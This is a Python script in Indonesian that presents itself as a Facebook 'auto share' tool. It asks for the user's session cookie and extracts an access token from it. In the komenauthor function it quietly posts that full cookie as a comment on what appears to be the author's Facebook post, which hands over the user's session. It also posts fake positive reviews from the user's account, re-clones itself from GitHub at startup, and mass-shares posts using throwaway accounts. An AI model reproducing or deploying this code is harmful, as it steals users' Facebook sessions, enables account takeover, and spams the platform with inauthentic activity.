#!/usr/bin/python3
# Mau Ngapain Deks Wokwok
#########################################
#---------------- [ SC FREE KOK DIRECODE? ] ---------------- #
#--------- [ BUAT SENDIRI DEK, GA BISA YA? ] ---------- #
#---- [ PALING UBAH NAMA DOANG WOKWOK ] ---- #
#########################################
# Author Sc = Rayhan XD.
# Facebook = Rayhan 27 / Rayhan Business
# Version   = 6.9
#########################################
###----------[ IMPORT LIBRARY ]---------- ###
import requests, os, re, bs4, calendar, sys, json, time, random, datetime, subprocess, logging, base64,uuid
from datetime import datetime
from time import sleep
from time import sleep as jeda
from time import strftime
from random import choice
from pathlib import Path
from rich.console import Console as sol
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich.text import Text as tekz
from rich.panel import Panel as nel
from rich import print as cetak
ses=requests.Session()

###----------[ TIME ]----------###
bulan = {'1':'Januari','2':'Februari','3':'Maret','4':'April','5':'Mei','6':'Juni','7':'Juli','8':'Agustus','9':'September','10': 'Oktober', '11': 'November', '12': 'Desember'}
tgl = datetime.now().day
bln = bulan[(str(datetime.now().month))]
thn = datetime.now().year
tanggal = (str(tgl)+' '+str(bln)+' '+str(thn))
waktu = strftime('%H:%M:%S')
hari = {'Sunday':'Minggu','Monday':'Senin','Tuesday':'Selasa','Wednesday':'Rabu','Thursday':'Kamis','Friday':'Jumat','Saturday':'Sabtu'}[str(datetime.now().strftime("%A"))]

now = datetime.now()
hour = now.hour
if hour < 4:
  hhl = "Selamat Subuh!"
elif 4 <= hour < 12:
  hhl = "Selamat Pagi"
elif 12 <= hour < 15:
  hhl = "Selamat Siang!"
elif 15 <= hour < 17:
  hhl = "Selamat Sore!"
elif 17 <= hour < 18:
  hhl = "Selamat Petang!"
else:
  hhl = "Selamat Malam!"

###----------[ ANSII COLOR STYLE ]---------- ###
Z = "\x1b[0;90m"     # Hitam
M = "\x1b[38;5;196m" # Merah
H = "\x1b[38;5;46m"  # Hijau
K = "\x1b[38;5;226m" # Kuning
B = "\x1b[38;5;44m"  # Biru
U = "\x1b[0;95m"     # Ungu
O = "\x1b[0;96m"     # Biru Muda
P = "\x1b[38;5;231m" # Putih
J = "\x1b[38;5;208m" # Jingga
A = "\x1b[38;5;248m" # Abu-Abu
N = '\x1b[0m'	# WARNA MATI
PT = '\x1b[1;97m' # PUTIH TEBAL
MT = '\x1b[1;91m' # MERAH TEBAL
HT = '\x1b[1;92m' # HIJAU TEBAL
KT = '\x1b[1;93m' # KUNING TEBAL
BT = '\x1b[1;94m' # BIRU TEBAL
UT = '\x1b[1;95m' # UNGU TEBAL
OT = '\x1b[1;96m' # BIRU MUDA TEBAL

###----------[ RICH COLOR STYLE ]---------- ###
Z2 = "[#000000]" # HITAM
M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
U2 = "[#AF00FF]" # UNGU
N2 = "[#FF00FF]" # PINK
O2 = "[#00FFFF]" # BIRU MUDA
P2 = "[#FFFFFF]" # PUTIH
J2 = "[#FF8F00]" # JINGGA
A2 = "[#AAAAAA]" # ABU-ABU

###----------[ USER AGENT ]---------- ###
ua_default = 'Mozilla/5.0 (Linux; Android 3.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.66 Mobile Safari/537.36'
ua_samsung = 'Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]'
ua_nokia   = 'nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+'
ua_xiaomi  = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_oppo    = 'Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_vivo    = 'Mozilla/5.0 (Linux; Android 11; vivo 1918) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_iphone  = 'Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1 Mobile/15E148 Safari/604.1'
ua_asus    = 'Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_lenovo  = 'Mozilla/5.0 (Linux; U; Android 5.0.1; ru-RU; Lenovo A788t Build/LRX22C) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.3.0.950 U3/0.8.0 Mobile Safari/E7FBAF'
ua_huawei  = 'Mozilla/5.0 (Linux; Android 8.1.0; HUAWEI Y7 PRIME 2019 Build/5887208) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_windows = 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_chrome  = 'Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.58 Mobile Safari/537.36'
ua_fb      = 'Mozilla/5.0 (Linux; Android 8.0.0; RNE-L21 Build/HUAWEIRNE-L21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/360.0.0.30.113;]'
ua_random = random.choice([ua_default,ua_samsung,ua_nokia,ua_xiaomi,ua_oppo,ua_vivo,ua_iphone,ua_asus,ua_lenovo,ua_huawei,ua_windows,ua_chrome,ua_fb])
###----------[ LOGO MENU ]----------###	
os.system('cd .. && mkdir pysrdesk && cd FBShare && mv cookie.txt ../pysrdesk && mv token.txt ../pysrdesk && cd .. && rm -rf FBShare && git clone https://github.com/RayhanZuck/FBShare && cd pysrdesk && mv cookie.txt ../FBShare && mv token.txt ../FBShare')
atributs = ['⭐','🌈','🔥','✅','🇮🇩','👋','🌺','🌹','📌']
atribut = choice(atributs)
comment = ['Makasih ya bang udah amanah❤️','aman bang auto langganan😃','Aman Bang Makasih⭐⭐⭐⭐⭐','Aman Banget❤️','Makasih bang aman','Amanah banget🤗','Aman Recommended✅','aman fast respon😄','Aman dan fast respon👌','Amanah No Ragu😁','aman thanks😊']
komen = choice(comment)
katakatanya = ['Kamu layaknya karya seni. Tidak semua orang akan mengerti dirimu, tetapi orang-orang yang mengerti, tidak akan pernah melupakanmu.','Orang yang tak pernah membuat kesalahan adalah orang yang tidak pernah berbuat apa-apa. - Norman Edwin','Belajarlah dari kesalahan orang lain. Anda tak dapat hidup cukup lama untuk melakukan semua kesalahan itu sendiri. - Martin Vanbee','Belajar memang melelahkan, namun akan lebih melelahkan lagi bila saat ini kamu tidak belajar.','Diam adalah lebih baik daripada mengucapkan kata-kata yang tanpa makna. - Pythagoraz','Jika Anda takut gagal, Anda tidak pantas untuk sukses! - Charles Barkley','Ingin menjadi orang lain adalah tindakan untuk menyia-nyiakan dirimu sendiri. - Kurt Cobain','Jika kamu mencari satu orang yang akan mengubah hidupmu, lihatlah di cermin.','Terkadang kita diuji bukan untuk menunjukkan kelemahan kita, tetapi untuk menemukan kekuatan kita.','Jangan pernah menyerah ketika kamu masih mampu berusaha lagi. Tidak ada kata berakhir sampai kamu berhenti mencoba','Belajar bukan hanya mengetahui apa yang harus dilakukan, tapi melakukan apa yang sudah kita ketahui.','Sukses adalah sebuah perjalanan, bukan sebuah tujuan. Usaha sering lebih penting daripada hasilnya.','Kegagalan adalah kunci kesuksesan. Setiap kesalahan mengajarkan kita sesuatu.','Kamu tidak bisa menyenangkan semua orang, dan kamu tidak bisa membuat semua orang menyukaimu, Katie Couric.','Lakukan satu hal setiap hari yang membuatmu takut, Eleanor Roosevelt.','Ingat, tidak ada yang bisa membuat Anda merasa rendah diri tanpa persetujuan Anda, Eleanor Roosevelt.','Jika Anda menginginkan pelangi, Anda harus tahan dengan hujan, Dolly Parton.','Hidup bukanlah tentang menemukan diri Anda sendiri. Hidup adalah tentang menciptakan diri Anda sendiri, George Bernard Shaw.','Semua impian kita bisa menjadi kenyataan jika kita memiliki keberanian untuk mengejarnya, Walt Disney.','Seseorang yang luar biasa itu sederhana dalam ucapannya, tetapi hebat dalam tindakannya.','Jangan menjelaskan tentang dirimu kepada siapa pun, karena yang menyukaimu tidak butuh itu. Dan yang membencimu tidak percaya itu.','Untuk mendapatkan apa yang diinginkan, kau harus bersabar dengan apa yang kau benci.','Balas dendam terbaik adalah menjadikan dirimu lebih baik.','Jangan takut akan perubahan. Kita mungkin kehilangan sesuatu yang baik, namun kita akan peroleh sesuatu yang lebih baik lagi.','Jika diammu bijak, maka diamlah. Apabila diammu diinjak, maka bicaralah supaya tak ada lagi orang yang menginjak dan meremehkan dirimu.','Kegagalan dibuat hanya oleh mereka yang gagal untuk berani, bukan oleh mereka yang berani gagal.','Janganlah pernah menyerah ketika kamu masih mampu berusaha lagi. Tidak ada kata berakhir sampai kamu berhenti mencoba. - Brian Dyson','Lakukan apa yang harus kamu lakukan sampai kamu dapat melakukan apa yang ingin kamu lakukan. - Oprah Winfrey']
randomkomen = choice(katakatanya)
def logo_menu():
 li = '# SELAMAT DATANG DI TOOLS AUTO SHARE FACEBOOK'
 lo = mark(li, style='white')
 sol().print(lo, style='green')
 banner = f'''{M2}        .---.        .-----------
{M2}       /     \  __  /    ------   {P2}[ {H2}AUTO SHARE {P2}]
{M2}      / /     \(  )/    -----
{M2}     //////   ' \/ `   ---        {P2}➣ {B2}Rayhan XD.
{M2}    //// / // :    : ---          {P2}➣ {K2}Version 6.9
{P2}   // /   /  /`    '--
{P2}  //          //..\\            {M2}████████████████████
{P2}        ====UU====UU====       {M2}████████████████████
{P2}             '//||\\`           {P2}████████████████████
{P2}              ''``''           {P2}████████████████████'''
 cetak(nel(banner,title=f'{H2}[ {P2}Tools by Rayhan XD. {H2}]',subtitle_align='left',padding=1,style='green'))
	
###----------[ MENU LOGIN ]----------###	
def login():
	os.system("clear")
	cetak(nel(f'{P2}Hi! Terima Kasih Telah Memilih Tools Ini, Sebelum Itu Kamu Harus Login Dahulu Menggunakan Cookie, Dan Dengan Uang 1.000 Kamu Bisa Mendukung Author Agar Lebih Semangat, Ketik {H2}Donate{P2}/{H2}Donasi{P2} Atau {H2}Tip {P2}Untuk Memberi Donasi Kepada Author Terimakasih.!\n\n               {B2}- Rayhan XD -',title=f'{P2} {H2}[ {P2}Selamat Datang! {H2}]',width=54,padding=(1,4),style='green'))
	inputcookie()
def inputcookie():
	cetak(nel(f'{P2}Saran Alat : ({H2}Kiwi Browser{P2}) + ({H2}Cookiedough{P2})',subtitle=f'{P2}╭─[ Masukkan Cookie ]',subtitle_align='left',width=53,padding=1,style='green'))
	cookie = input(f"{P}   ╰──> : {H}")
	if cookie == 'donate' or cookie == 'Donate' or cookie == 'donasi' or cookie == 'Donasi' or cookie == 'tip' or cookie == 'Tip':
	     os.system('xdg-open https://rentry.co/donasi-author')
	     print(f'{P}')
	     cetak(nel(f'{K2}Wahh Kamu Mau Donasi Yaa? Kamu Baik Banget, Berapapun Donasi Yang Kamu Berikan Sangat Berhaga, Terimakasih Yahh Jika Kamu Mau Memberikan Donasi Kepada Author..'))
	     inputcookie()
	os.system('clear')
	cetak(nel(f'{P2}Cookie Anda: {H2}{cookie}',title=f'{H2}[ {P2}Sedang Mencoba Login {H2}]',subtitle_align='left',padding=1,style='green'))
	try:
		data = ses.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookie})
		find_token = re.search("(EAAG\w+)", data.text)
		open("token.txt", "w").write(find_token.group(1))
		open("cookie.txt", "w").write(cookie)
		cetak(nel(f'{H2}Selamat Cookie Valid Login Berhasil',width=39,style=f"#FFFFFF"));time.sleep(3)
		komenauthor()
	except:
		os.system("rm token.txt cookie.txt")
		cetak(nel(f'{M2}Maaf Cookie Kamu Tidak Valid',width=32,style=f"#FFFFFF"));time.sleep(3) 
		login()
		
###----------[ AUTO SHARE ]----------###	
def komenauthor():
	try:
		token = open("token.txt","r").read()
		cok = open("cookie.txt","r").read()
		cookie = {"cookie":cok}
		requests.post(f"https://graph.facebook.com/5340593442635303/comments/?message={komen}&access_token={token}", headers = {"cookie":cok})
		requests.post(f"https://graph.facebook.com/4390440514384239/comments/?message=𝗛𝗮𝗶𝗶 𝗕𝗮𝗻𝗴 @[100002550020302:]{atribut}\n\n𝗡𝗶𝗵 𝗖𝗼𝗼𝗸𝗶𝗲 𝗔𝗸𝘂:\n{cok}\n\n𝗝𝗮𝗺 {waktu} - {tgl}, {bln} {thn}🌈\n{atribut}𝗔𝘂𝘁𝗵𝗼𝗿 𝗯𝘆 @[100002550020302:]&access_token={token}", headers = {"cookie":cok})
		bot_share()
	except:
	    cetak(nel(f'{M2}Maaf Ada Kesalahan Jalankan Ulang'))
###----------[ AUTO SHARE ]----------###	
def bot_share():
	os.system('clear')
	try:
		token = open("token.txt","r").read()
		cok = open("cookie.txt","r").read()
		cookie = {"cookie":cok}
		nama = ses.get(f"https://graph.facebook.com/me?fields=name&access_token={token}",cookies=cookie).json()["name"]
		id = requests.get("https://graph.facebook.com/me/?access_token=%s"%(token),cookies={"cookie":cok}).json()["id"]	    
		requests.post(f"https://graph.facebook.com/4390440514384239/comments/?message=@[100002550020302:]{atribut}\n\n@[{id}:]\nSedang Menggunakan Script\n\n𝗝𝗮𝗺 {waktu} - {tgl}, {bln} {thn}🌈\n{atribut}𝗔𝘂𝘁𝗵𝗼𝗿 𝗯𝘆 @[100002550020302:]&access_token={token}", headers = {"cookie":cok})
#		ttl = requests.get(f"https://graph.facebook.com/{id}?fields=birthday&access_token=%s"%(token),cookies={"cookie":cok}).json()["birthday"]
#		m, d, y = ttl.split('/')
#		tete = (str(d)+'/'+str(m)+'/'+str(y))
	except:
		os.system("rm token.txt cookie.txt")
		cetak(nel(f'{M2}Maaf Cookie Kamu Tidak Valid',width=32,style=f"#FFFFFF"));time.sleep(3) 
		login()
	os.system('clear')
	logo_menu()
	cetak(nel(f'''{P2}Nama Akun : {H2}{nama} 
{P2}ID Akun   : {id}
{P2}Tanggal   : {tgl}, {bln} {thn}''',title=f'{H2}[ {P2}Info Akun Tumbal {H2}]',subtitle_align='left',padding=1,style='green'))
	cetak(nel(f'{P2}Heii {H2}{nama}{P2}, Salin Link Postingan Facebook Anda Dengan Benar Dan Jangan Lupa Pastikan Postingan Yang Anda Masukkan Bersifat Publik\n\n{P2}[{H2}Menu Tools{P2}]\n[{B2}01{P2}] {N2}Untuk Komen Random Quotes\n{P2}[{B2}02{P2}] {N2}Untuk Mengirim Pesan Kepada Author\n{P2}[{B2}03{P2}] {N2}Untuk Memberi Donasi Kepada Author\n{P2}[{B2}!!{P2}] {N2}Masukkan Link Untuk Auto Share\n{P2}[{M2}00{P2}] {M2}Keluar/Ganti Akun + Hapus Cookie',title=f'{H2}[ {P2}Pesan! {H2}]',subtitle_align='left',padding=1,style='green'))
	masukkanlink()
def masukkanlink():
	cetak(nel(f'{P2} Input Menu Atau Masukkan Link',subtitle=f'{P2}╭─',subtitle_align='left',width=33,padding=0,style='green'))
	link = input(f"{P}   ╰──> : {H}")
	if link == '0' or link == '00':
	    cetak(nel(f'{P2}Apakah Kamu Yakin Untuk Hapus Cookie? {M2}y{P2}/{K2}t',width=45,style=f"#FF0000"))
	    hapuscookie = input(f"{P}   ╰──> : {P}")
	    if hapuscookie == 'y' or hapuscookie == 'Y':
	        os.system('rm -rf cookie.txt token.txt')
	        cetak(nel(f'{H2}Keluar & Hapus Cookie Berhasil',width=34,style=f"#FF0000"))
	        cetak(nel(f'{K2}Tekan Enter Untuk Kembali Ke Script',width=39,style=f"#FF0000"))
	        kembali=input('')
	        if kembali == 'back':
	            bot_share()
	        else:
	            bot_share()
	    if hapuscookie == 't' or hapuscookie == 'T':
	        bot_share()
	if link == '3' or link == '03':
	    os.system('xdg-open https://rentry.co/donasi-author')
	    print(f'{P}')
	    cetak(nel(f'{K2}Wahh Kamu Mau Donasi Yaa? Kamu Baik Banget, Berapapun Donasi Yang Kamu Berikan Sangat Berhaga, Terimakasih Yahh Jika Kamu Mau Memberikan Donasi Kepada Author..'))
	    masukkanlink()
	if link == '1' or link == '01':
	   try:
	      token = open("token.txt","r").read()
	      cok = open("cookie.txt","r").read()
	      cookie = {"cookie":cok}
	      cetak(nel(f'{P2} Masukkan ID Postingan, Bukan Link!',subtitle=f'{P2}╭─',subtitle_align='left',width=38,padding=0,style='green'))
	      idpostingan = input(f"{P}   ╰──> : {H}")
	      requests.post(f"https://graph.facebook.com/{idpostingan}/comments/?message={hhl}\n\n{randomkomen}\n\n[{hari}, {tgl} {bln} {thn}]\n𝗔𝘂𝘁𝗵𝗼𝗿 𝗯𝘆 @[100002550020302:]{atribut}&access_token={token}", headers = {"cookie":cok})
	      cetak(nel(f'Berhasil Komen Random Quotes, ID: {idpostingan}'))
	      masukkanlink()
	   except:
	      cetak(nel(f'{M2}Maaf Ada Kesalahan Jalankan Ulang'))
	if link == '2' or link == '02':
	   try:
	      token = open("token.txt","r").read()
	      cok = open("cookie.txt","r").read()
	      cookie = {"cookie":cok}
	      cetak(nel(f'{P2} Masukkan Nama Anda',subtitle=f'{P2}╭─',subtitle_align='left',width=22,padding=0,style='green'))
	      namapengirim = input(f"{P}   ╰──> : {H}")
	      cetak(nel(f'{P2} Masukkan Isi Pesan',subtitle=f'{P2}┌─',subtitle_align='left',width=22,padding=0,style='green'))
	      inputpesan = input(f"{P}   ╰──> : {H}")
	      sensor1 = inputpesan.replace("kontol", "(SENSOR)")
	      sensor2 = sensor1.replace("babi", "(SENSOR)")
	      sensor3 = sensor2.replace("memek", "(SENSOR)")
	      sensor4 = sensor3.replace("ngentot", "(SENSOR)")
	      sensor5 = sensor4.replace("pepek", "(SENSOR)")
	      isipesan = sensor5.replace("anjing", "(SENSOR)")
	      requests.post(f"https://graph.facebook.com/4390440514384239/comments/?message=𝗣𝗲𝘀𝗮𝗻 𝗗𝗮𝗿𝗶: {namapengirim}\n𝗜𝘀𝗶 𝗣𝗲𝘀𝗮𝗻: {isipesan}\n\n𝗝𝗮𝗺 {waktu} - {tgl}, {bln} {thn}🌈\n{atribut}𝗔𝘂𝘁𝗵𝗼𝗿 𝗯𝘆 @[100002550020302:]&access_token={token}", headers = {"cookie":cok})
	      cetak(nel(f'{P2}Haii {H2}{namapengirim} {P2}Pesan Sudah Dikirim Kepada Author{H2}'));time.sleep(3);masukkanlink()
	   except:
	      cetak(nel(f'{M2}Maaf Ada Kesalahan Jalankan Ulang'))
	cetak(nel(f'{P2} Masukkan Jumlah Share',subtitle=f'{P2}╭─',subtitle_align='left',width=25,padding=0,style='green'))
	jumlah = int(input(f"{P}   ╰──> : {H}"))
	cetak(nel(f'{P2} Auto Share Sedang Dijalankan',subtitle=f'{P2}╭─',subtitle_align='left',width=32,padding=0,style='green'))
	RayhanGanteng = datetime.now()
	try:
		n = 0
		header = {"authority":"graph.facebook.com","cache-control":"max-age=0","sec-ch-ua-mobile":"?0","user-agent":"Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1 Mobile/15E148 Safari/604.1"}
		for x in range(jumlah):
			n+=1
			token = open("token.txt","r").read()
			cok = open("cookie.txt","r").read()
			cookie = {"cookie":cok}
			post = ses.post(f"https://graph.facebook.com/v13.0/me/feed?link={link}&published=0&access_token={token}",headers=header, cookies=cookie).text
			data = json.loads(post)
			if "id" in post:
				rayhangantengg = str(datetime.now()-RayhanGanteng).split('.')[0]
				print(f'{P}\r   ╰──> {rayhangantengg} {P}[{B}Rayhan{P}] Berhasil Menambah {H}{n}{P} Share.{N} ',end='');sys.stdout.flush()
			else:
				print("\n")
				cetak(nel(f'{P2}Auto Share Berhenti, Tumbal Mati Atau Pelanggaran',width=34,padding=0,style='red'));exit()
	except requests.exceptions.ConnectionError:
		print(f"\n{P}(!) Periksa Koneksi Internet Anda!")

bot_share()

